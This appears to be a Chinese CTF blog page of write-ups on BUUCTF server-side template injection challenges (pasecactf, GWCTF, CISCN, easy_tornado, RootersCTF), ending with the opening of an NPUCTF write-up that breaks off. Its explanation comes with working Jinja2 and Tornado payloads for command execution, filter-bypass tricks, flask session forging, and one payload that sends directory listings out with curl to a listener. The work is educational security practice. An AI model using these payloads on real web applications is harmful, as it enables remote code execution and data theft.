href="#pasecactf-2019-flask-ssti-编码绕过" class="headerlink" title="[pasecactf_2019]flask_ssti 编码绕过"></a>[pasecactf_2019]flask_ssti 编码绕过</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130128195.png" alt="image-20220223130128195"></p><p>存在模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130221897.png" alt="image-20220223130221897"></p><p>列举子类被禁止</p><p>经过测试，发现是 __   .    ‘  被过滤</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130556622.png" alt="image-20220223130556622"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130610494.png" alt="image-20220223130610494"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130822136.png" alt="image-20220223130822136"></p><p>转16进制绕过</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223221456791.png" alt="image-20220223221456791"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223222201394.png" alt="image-20220223222201394"></p><p>exp </p><pre><code class="python">&#123;&#123;""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("whoami")["read"]()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223224419318.png" alt="image-20220223224419318"></p><p>解法一:</p><p>读取app.py源码,发现:</p><pre><code class="python">def encode(line, key, key2): return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;) </code></pre><p>读取config，flag值为</p><pre><code>&#39;-M7\x10w\x12d9cT#`&#125;\x0e\x1e\x0fiS(D\x1e\x13X\x17&#123;n\x03g\x02\t\x10[#\x07/(Ak\x15^NG&#39;&#125;&gt; </code></pre><p>解密脚本:</p><pre><code class="python">key=&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;key2=&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;flag_encoded=&#39;这里放加密后的flag&#39;flag=&#39;&#39;for x in range(len(flag_encoded)):    for i in range(33,127):        if flag_encoded[x]==chr(x ^ i ^ ord(key[::-1][x]) ^ ord(key2[x])):            flag+=chr(i)            print(flag)</code></pre><p>解法二:</p><p><code>/proc/self</code>表示当前进程目录</p><p>获取当前进程打开的文件内容:cat /proc/self/fd/{id}</p><p><strong>注意：</strong>在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的。因为如果 cat读取/proc/self/cmdline/的话，得到的是 cat进程的信息。所以我们要通过题目的当前进程使用读取文件（比如，文件包含漏洞，，SSTI，，file:\\本地读取，，../../../目录穿越，，SSRF）的方式读取/proc/self/cmdline</p><pre><code>&#123;&#123;()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")&#125;&#125;</code></pre><h3 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226141959161.png" alt="image-20220226141959161"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226142008734.png" alt="image-20220226142008734"></p><p>测了一下，给了个php的报错</p><p>这里其实给了一个编出来的PHP假报错（害人）</p><p><code>&#123;&#123;...&#125;&#125;</code>装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。<br><code>&#123;% ... %&#125;</code>：装载一个控制语句。<br><code>&#123;# ... #&#125;</code>：装载一个注释，模板渲染的时候会忽视这中间的值。</p><p>双大括号这种表示方式就是可以直接回显在页面上的，而这种方式被过滤了，那我们就使用<code>&#123;% ... %&#125;</code>语句</p><p><code>&#123;% %&#125;</code>可以配合<code>if()</code>或者<code>print()</code>函数进行输出</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226143333684.png" alt="image-20220226143333684"></p><p>成功回显</p><p>lipsum是一个方法</p><p>该方法常用payload</p><pre><code class="python">&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></pre><pre><code class="python">&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('whoami').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145434182.png" alt="image-20220226145434182"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145458311.png" alt="image-20220226145458311"></p><pre><code class="python">name=&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('cat /flag_1s_Hera').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145533225.png" alt="image-20220226145533225"></p><p>第二种方法</p><p>源码如下:</p><pre><code class="python">blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;];for no in blacklist:    while True:        if no in s:            s = s.replace(no, &#39;&#39;)        else:            breakreturn s</code></pre><p>先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因此这里用双写是无法绕过的，但是这种过滤的逻辑是错误的，如下这种构造是无法被过滤的：</p><pre><code class="python">&#123;%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__('oconfigs').poconfigpen('whoami').read()%&#125;</code></pre><p>因为<code>config</code>字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行<code>config</code>的过滤，但是过滤完<code>config</code>之后才会出现黑名单中前面的字符串，因此可以绕过。</p><p>第三种方法，不用print，使用curl外带</p><pre><code class="python">&#123;% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://127.0.0.1:2333/ -d `ls /|base64`') %&#125;1&#123;% endiconfigf %&#125;</code></pre><p>vps监听2333端口即可</p><h3 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board"><a href="#CISCN2019-总决赛-Day1-Web3-Flask-Message-Board" class="headerlink" title="[CISCN2019 总决赛 Day1 Web3]Flask Message Board"></a>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h3><p>Fuzz了一波，发现这里无论输入什么都会提示被拒绝，但是<code>Title</code>、<code>Author</code>和<code>Content</code>里面输入<code>1+1</code>就不会，并且回显的是<code>Author</code>的内容。</p><p>那么我们尝试一下，让title和content里的内容为1+1，Author输出我们需要的值</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161218167.png" alt="image-20220226161218167"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161227059.png" alt="image-20220226161227059"></p><p>我们发现了一个好玩的东西</p><pre><code class="html">&#39;SECRET_KEY&#39;: &#39;ill|111|IIlI1lI|I1i|IiliIIli||i1|l||i1il&#39;</code></pre><p>有了这个我们可以来伪造session</p><p>我们抓下包看看</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161500978.png" alt="image-20220226161500978"></p><p>对seesion解密</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161529089.png" alt="image-20220226161529089"></p><p>发现 “admin”:false  猜测要伪造admin</p><p>使用flask-unsign</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145626791.png" alt="image-20220227145626791"></p><p>成功访问/admin</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145809505.png" alt="image-20220227145809505"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145856114.png" alt="image-20220227145856114"></p><p>看一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150134900.png" alt="image-20220227150134900"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150430998.png" alt="image-20220227150430998"></p><p>源码是随机显示一部分，但是好在位置固定，通过脚本复原即可：</p><pre><code class="python">import requestsurl = &#39;http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos&#39;r = requests.get(url)source = r.textfor j in range(10):    r = requests.get(url)    for i in range(len(source)):        if source[i].isspace():            source = source[:i] + r.text[i] + source[i+1:]print(source)</code></pre><p>是和tensorflow有关</p><p>不了解tensorflow，看官方wp：</p><p>通过tensorflow运行下面代码，</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12</code></th><th><code>import tensorflow as tf # Tensorboard可视化 def init(model_path):    new_sess = tf.Session()    meta_file = model_path + &quot;.meta&quot;    model = model_path    saver = tf.train.import_meta_graph(meta_file)    saver.restore(new_sess, model)    return new_sess sess = init(&#39;detection_model/detection&#39;) writer = tf.summary.FileWriter(&quot;./log&quot;, sess.graph) # 然后在命令行执行tensorboard --logdir ./log </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>在对应端口查看图结构，发现当输入的字符串字符总和为1024时会触发读取<code>/flag</code>的后门，此时转向处理输入的函数：</p><p>复制</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16</code></th><th><code>def predict(sess, x):    &#39;&#39;&#39;    :param x: input number x        sess: tensorflow session    :return: b&#39;You are: *&#39;    &#39;&#39;&#39;    y = sess.graph.get_tensor_by_name(&quot;y:0&quot;)    y_out = sess.run(y, &#123;&quot;x:0&quot;: x&#125;)    return y_out def check_bot(input_str):    r = predict(sess, sum(map(ord, input_str)))    return r if isinstance(r, str) else r.decode() # check_result = check_bot(content) # check_bot函数只处理了输入框接收的内容，因此只有输入框可以触发读取</code>/flag<code>的后门。 </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>这里<strong>将输入的字符串转化为ASCII码然后求和作为x的值</strong>，需要将x的值改为1024，于是构造一个ASCII码值和为1024的字符串赋值x：</p><blockquote><p>aaaaaabxCZC</p></blockquote><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152804895.png" alt="image-20220227152804895"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152731787.png" alt="image-20220227152731787"></p><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227161912581.png" alt="image-20220227161912581"></p><p>当文件名和filehash不匹配，会报错</p><pre><code class="html">http://f9bce56c-7ea3-4a3e-8c9e-48df6af87351.node4.buuoj.cn:81/error?msg=Error</code></pre><p>猜测msg可控，测试tornado模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162403996.png" alt="image-20220227162403996"></p><p>来了个orz？？</p><p>还是去搜资料吧</p><p>在tornado模板中，存在一些可以访问的快速对象，比如 <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>，这个其实就是handler.settings对象，里面存储着一些环境变量，具体分析请参照《<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162508416.png" alt="image-20220227162508416"></p><p>直接爆出来了cookie_secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162618736.png" alt="image-20220227162618736"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162629687.png" alt="image-20220227162629687"></p><p>可以推算出filehash的值</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163147952.png" alt="image-20220227163147952"></p><h3 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163739351.png" alt="image-20220227163739351"></p><p>里面只有这个，盲猜目录  xxx/secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163835456.png" alt="image-20220227163835456"></p><p>猜测存在参数secret</p><p>随便输入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163930104.png" alt="image-20220227163930104"></p><p>报错，寻找可用信息</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164006319.png" alt="image-20220227164006319"></p><p>发现会对输入的值进行rc4解密</p><p>放一个RC4加密脚本</p><pre><code class="python">import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4加密主函数&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可    # print(&quot;原来的 s 盒：%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;调用加密程序成功。&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))    #print(&quot;加密后的输出(经过编码):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;&quot;)</code></pre><p>可得payload：</p><pre><code class="html">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164255493.png" alt="image-20220227164255493"></p><h3 id="RootersCTF2019-I-lt-3-Flask-用name注入"><a href="#RootersCTF2019-I-lt-3-Flask-用name注入" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask 用name注入"></a>[RootersCTF2019]I_&lt;3_Flask 用name注入</h3><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p>这道题是模板注入。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h5><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110436293.png" alt="image-20220211110436293"></p><h4 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h4><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111724780.png" alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112747491.png" alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020 ezinclude_0x90-0x9F</title>
      <link href="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/"/>
      <url>/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/</url>
      
        <content type="html"><![CDATA[<p>最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png" alt="image-20220213124200210"></p><p>进去直接来个错误？？？WTF?</p><p>看下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124258414.png" alt="image-20220213124258414"></p><p>疑似哈希长度拓展攻击，抓下包看看</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124348253.png" alt="image-20220213124348253"></p><p>芜湖，hash直接给我了？</p><p>直接传好像不太行?</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124718726.png" alt="image-20220213124718726"></p><p>祭出神器burp</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124626306.png" alt="image-20220213124626306"></p><p>得到文件名 flflflflag.php</p><p>访问一下文件:</p><p>得到如下response</p><pre><code class="html">HTTP/1.1 200 OKServer: openrestyDate: Sun, 13 Feb 2022 04:47:35 GMTContent-Type: text/html; 